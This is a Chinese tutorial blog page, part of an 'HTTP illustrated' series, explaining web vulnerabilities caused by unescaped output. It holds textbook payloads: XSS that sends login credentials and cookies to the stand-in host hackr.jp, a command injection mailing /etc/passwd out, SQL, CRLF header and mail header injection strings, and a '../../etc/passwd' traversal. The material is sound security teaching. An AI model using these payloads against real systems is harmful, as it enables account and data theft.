@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32-32.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16-16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="http图解（17）：安全漏洞-输出值转义不完全">
+<meta property="og:url" content="http://example.com/2023/04/04/http-17/index.html">
+<meta property="og:site_name" content="Hello Friend">
+<meta property="og:description" content="当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/6.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/7.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/8.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/9.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/10.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/11.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/12.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/13.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/14.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/15.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/16.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/17.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/18.png">
+<meta property="og:image" content="http://example.com/2023/04/04/http-17/19.png">
+<meta property="article:published_time" content="2023-04-04T00:50:50.000Z">
+<meta property="article:modified_time" content="2023-04-04T05:52:34.630Z">
+<meta property="article:author" content="姜海鹏">
+<meta property="article:tag" content="http">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/04/04/http-17/6.png">
+
+<link rel="canonical" href="http://example.com/2023/04/04/http-17/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>http图解（17）：安全漏洞-输出值转义不完全 | Hello Friend</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hello Friend</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>日志</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/04/http-17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar-prey-parrot.jpg">
+      <meta itemprop="name" content="姜海鹏">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Friend">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          http图解（17）：安全漏洞-输出值转义不完全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-04 08:50:50 / 修改时间：13:52:34" itemprop="dateCreated datePublished" datetime="2023-04-04T08:50:50+08:00">2023-04-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
+<span id="more"></span>
+<p><img src="/2023/04/04/http-17/6.png" alt="6"></p>
+<blockquote>
+<p>客户端验证，一般采用JavaScript，客户端允许篡改数据或关闭JavaScript，客户端验证只是为了尽早地辨识输入错误，提高UI体验；<br>服务端验证，输入值有可能是具有攻击性的代码，需要检查是否符合系统业务逻辑的数值或检查字符编码等预防对策；<br>从数据库或文件系统、HTML、邮件等输出数据时，针对输出做值转义处理是一项至关重要的安全策略；</p>
+</blockquote>
+<h1 id="跨站脚本攻击（Cross-Site-Scripting，XSS）"><a href="#跨站脚本攻击（Cross-Site-Scripting，XSS）" class="headerlink" title="跨站脚本攻击（Cross-Site Scripting，XSS）"></a>跨站脚本攻击（Cross-Site Scripting，XSS）</h1><blockquote>
+<p>通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击；<br>是攻击者利用预先设置的陷阱触发的被动攻击；</p>
+</blockquote>
+<p>可能造成的影响：</p>
+<blockquote>
+<p>利用虚假输入表单骗取用户个人信息；<br>利用脚本窃取用户的Cookie值，不知情的情况下，帮助攻击者发送恶意请求；<br>显示伪造文章或图片；</p>
+</blockquote>
+<h2 id="案例：动态创建的HTML安全漏洞（1）"><a href="#案例：动态创建的HTML安全漏洞（1）" class="headerlink" title="案例：动态创建的HTML安全漏洞（1）"></a>案例：动态创建的HTML安全漏洞（1）</h2><p><img src="/2023/04/04/http-17/7.png" alt="7"><br><img src="/2023/04/04/http-17/8.png" alt="8"></p>
+<blockquote>
+<p>动态创建的 HTML 部分有可能隐藏着安全漏洞；</p>
+</blockquote>
+<h2 id="案例：动态创建的HTML安全漏洞（2）"><a href="#案例：动态创建的HTML安全漏洞（2）" class="headerlink" title="案例：动态创建的HTML安全漏洞（2）"></a>案例：动态创建的HTML安全漏洞（2）</h2><p><img src="/2023/04/04/http-17/9.png" alt="9"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&quot;login&quot;);+f.action=&quot;http://hackr.jp/pwget&quot;;+f.method=&quot;get&quot;;&lt;/script&gt;&lt;span+s=&quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>创建以上这段恶意代码的URL，隐藏植入欺诈邮件或Web页面，诱使用户点击该URL；</p>
+</blockquote>
+<p><img src="/2023/04/04/http-17/10.png" alt="10"></p>
+<blockquote>
+<p>之后ID及密码会传给该正规网站，接下来是正常的登录步骤，用户很难意识登录信息泄露；</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># http://example.jp/login?ID=yama</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/logo.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;E! 拍卖会&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://example.jp/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input_id&quot;</span>&gt;</span></span><br><span class="line">  ID <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ID&quot;</span> <span class="attr">value</span>=<span class="string">&quot;yama&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># http://example.jp/login?ID=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+f=<span class="built_in">document</span>.getElementById(<span class="string">&quot;login&quot;</span>);+f.action=<span class="string">&quot;http://hackr.jp/pwget&quot;</span>;+f.method=<span class="string">&quot;get&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;span+s=&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/logo.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;E! 拍卖会 /&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;form action=&quot;</span><span class="attr">http:</span>//<span class="attr">example.jp</span>/<span class="attr">login</span>&quot; <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;input_id&quot;</span>&gt;</span></span><br><span class="line">  ID <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ID&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">var f=document.getElementById(&quot;login&quot;); f.action=&quot;http://hac</span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="案例：窃取用户Cookie"><a href="#案例：窃取用户Cookie" class="headerlink" title="案例：窃取用户Cookie"></a>案例：窃取用户Cookie</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http:<span class="comment">//hackr.jp/xss.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># http:<span class="comment">//hackr.jp/xss.js 文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> content = <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;img src=http://hackr.jp/?&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(content);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/04/http-17/11.png" alt="11"></p>
+<blockquote>
+<p>在可跨站脚本攻击安全漏洞的Web应用上，执行以上代码，就可访问该Web应用所处域名下的Cookie信息，并发送至攻击者网站，记录在登录日志中；</p>
+</blockquote>
+<h1 id="SQL注入攻击（SQL-Injection）"><a href="#SQL注入攻击（SQL-Injection）" class="headerlink" title="SQL注入攻击（SQL Injection）"></a>SQL注入攻击（SQL Injection）</h1><blockquote>
+<p>如果在调用SQL语句的方式上存在疏漏，就可能执行被恶意注入非法SQL语句；</p>
+</blockquote>
+<p>可能造成影响：</p>
+<blockquote>
+<p>非法查看或篡改数据库内的数据；<br>规避认证；<br>执行和数据库服务器业务关联的程序；</p>
+</blockquote>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><img src="/2023/04/04/http-17/12.png" alt="12"><br><img src="/2023/04/04/http-17/13.png" alt="13"></p>
+<blockquote>
+<p>正常的处理</p>
+</blockquote>
+<p><img src="/2023/04/04/http-17/14.png" alt="14"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">and</span> flag<span class="operator">=</span><span class="number">1</span> 这个条件被自动忽略</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> bookTbl <span class="keyword">WHERE</span> author <span class="operator">=</span><span class="string">&#x27;上野宣&#x27;</span> <span class="comment">--&#x27; and flag=1;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>显示全部的书籍，不管有没有flag标记；</p>
+</blockquote>
+<h1 id="OS命令注入攻击（OS-Command-Injection）"><a href="#OS命令注入攻击（OS-Command-Injection）" class="headerlink" title="OS命令注入攻击（OS Command Injection）"></a>OS命令注入攻击（OS Command Injection）</h1><blockquote>
+<p>通过Web应用，执行非法的操作系统命令达到攻击的目的，能调用 Shell 函数的地方就有存在被攻击的风险；<br>OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序；<br>过 OS 注入攻击可执行 OS 上安装着的各种程序；</p>
+</blockquote>
+<h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><p>以咨询表单的发送功能为例，该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。<br><img src="/2023/04/04/http-17/15.png" alt="15"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL, &quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;From: info@example.com\n&quot;;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>open 函数会调用 sendmail 命令发送邮件，指定的邮件发送地址即 $adr 的值；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者将下面的值指定作为邮件地址</span><br><span class="line">; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 程序接收该值，构成以下的命令组合</span><br><span class="line">| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>sendmail 命令执行被分隔后，接下去执行 cat /etc/passwd | mail <a href="mailto:&#x68;&#97;&#99;&#107;&#x40;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#x6a;&#x70;">&#x68;&#97;&#99;&#107;&#x40;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#x6a;&#x70;</a>，含有Linux 账户信息 /etc/passwd 的文件，以邮件形式发送给了<a href="mailto:&#104;&#97;&#x63;&#107;&#x40;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x6a;&#112;">&#104;&#97;&#x63;&#107;&#x40;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x6a;&#112;</a></p>
+</blockquote>
+<h1 id="HTTP首部注入攻击（HTTP-Header-Injection）"><a href="#HTTP首部注入攻击（HTTP-Header-Injection）" class="headerlink" title="HTTP首部注入攻击（HTTP Header Injection）"></a>HTTP首部注入攻击（HTTP Header Injection）</h1><p>攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Location: http://www.example.com/a.cgi?q=12345</span><br><span class="line">Set-Cookie: UID=12345</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie；<br>HTTP 首部注入可能通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击；</p>
+</blockquote>
+<p>可能造成影响：</p>
+<blockquote>
+<p>设置任何 Cookie 信息；<br>重定向至任意 URL；<br>显示任意的主体（HTTP 响应截断攻击）；</p>
+</blockquote>
+<h2 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h2><p><img src="/2023/04/04/http-17/16.png" alt="16"><br>选定类别后，类别ID值会反映在Location 首部字段内，令浏览器发生重定向跳转；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: http://example.com/?cat=101</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#攻击者以下面的内容替代之前的类别ID后发送请求</span><br><span class="line">101%0D%0ASet-Cookie:+SID=123456789</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>%0D%0A 是HTTP报文中的换行符，然后将会话ID设置成SID=123456789的Set-Cookie首部字段；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 假设返回结果</span><br><span class="line">Location: http://example.com/?cat=101（%0D%0A ：换行符）</span><br><span class="line">Set-Cookie: SID=123456789</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>部字段 Set-Cookie 已生效，攻击者可伪装成用户，通过和会话固定攻击组合进行攻击；</p>
+</blockquote>
+<h2 id="HTTP响应截断攻击（HTTP-Response-Splitting-Attack）"><a href="#HTTP响应截断攻击（HTTP-Response-Splitting-Attack）" class="headerlink" title="HTTP响应截断攻击（HTTP Response Splitting Attack）"></a>HTTP响应截断攻击（HTTP Response Splitting Attack）</h2><blockquote>
+<p>向首部主体内添加内容的攻击；<br>要将两个 %0D%0A%0D%0A 并排插入字符串后发送，利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行，能显示伪造的主体，达到攻击目的；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0D%0A%0D%0A&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>发送以上字符串，返回以下响应；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: UID=（%0D%0A ：换行符）</span><br><span class="line">（%0D%0A ：换行符）</span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段和主体部分全视为注释）</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等；<br>另，滥用 HTTP/1.1 中汇集多响应返回功能，会导致缓存服务器对任意内容进行缓存操作，用该缓存服务器的用户，在浏览遭受攻击的网站时，会不断地浏览被替换掉的 Web 网页；</p>
+</blockquote>
+<h1 id="邮件首部注入攻击（Mail-Header-Injection）"><a href="#邮件首部注入攻击（Mail-Header-Injection）" class="headerlink" title="邮件首部注入攻击（Mail Header Injection）"></a>邮件首部注入攻击（Mail Header Injection）</h1><p>攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。</p>
+<h2 id="案例-3"><a href="#案例-3" class="headerlink" title="案例"></a>案例</h2><p><img src="/2023/04/04/http-17/17.png" alt="17"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#攻击者将以下数据作为邮件地址发起请求</span><br><span class="line">bob@hackr.jp%0D%0ABcc: user@example.com</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>实现对Bcc邮件地址的追加发送；</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0A%0D%0ATest Message</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>以相同方式，可以改写To、Subject等任意邮件首部，或向文本添加附件；</p>
+</blockquote>
+<h1 id="目录遍历攻击（Directory-Traversal）"><a href="#目录遍历攻击（Directory-Traversal）" class="headerlink" title="目录遍历攻击（Directory Traversal）"></a>目录遍历攻击（Directory Traversal）</h1><blockquote>
+<p>通过Web应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用…/等相对路径定位到/etc/passed等绝对路径上，服务器上任意的文件或文件目录皆有可能被访问到；<br>固然存在输出值转义的问题，更应关闭指定对任意文件名的访问权限；</p>
+</blockquote>
+<h2 id="案例-4"><a href="#案例-4" class="headerlink" title="案例"></a>案例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取日志</span><br><span class="line">http://example.com/read.php?log=0401.log</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 攻击者改变查询字段</span><br><span class="line">http://example.com/read.php?log=../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/04/04/http-17/18.png" alt="18"></p>
+<h1 id="远程文件包含漏洞（Remote-File-Inclusion）"><a href="#远程文件包含漏洞（Remote-File-Inclusion）" class="headerlink" title="远程文件包含漏洞（Remote File Inclusion）"></a>远程文件包含漏洞（Remote File Inclusion）</h1><blockquote>
+<p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击；<br>固然存在输出值转义的问题，但更应控制对任意文件名的指定；</p>
+</blockquote>
+<p><img src="/2023/04/04/http-17/19.png" alt="19"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/http/" rel="tag"># http</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/03/http-16/" rel="prev" title="http图解（16）：Web攻击技术">
+      <i class="fa fa-chevron-left"></i> http图解（16）：Web攻击技术
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/04/04/http-18/" rel="next" title="http图解（18）：其他安全漏洞">
+      http图解（18）：其他安全漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          联系作者
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88Cross-Site-Scripting%EF%BC%8CXSS%EF%BC%89"><span class="nav-text">跨站脚本攻击（Cross-Site Scripting，XSS）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%9A%84HTML%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89"><span class="nav-text">案例：动态创建的HTML安全漏洞（1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%9A%84HTML%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%882%EF%BC%89"><span class="nav-text">案例：动态创建的HTML安全漏洞（2）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%EF%BC%9A%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7Cookie"><span class="nav-text">案例：窃取用户Cookie</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88SQL-Injection%EF%BC%89"><span class="nav-text">SQL注入攻击（SQL Injection）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 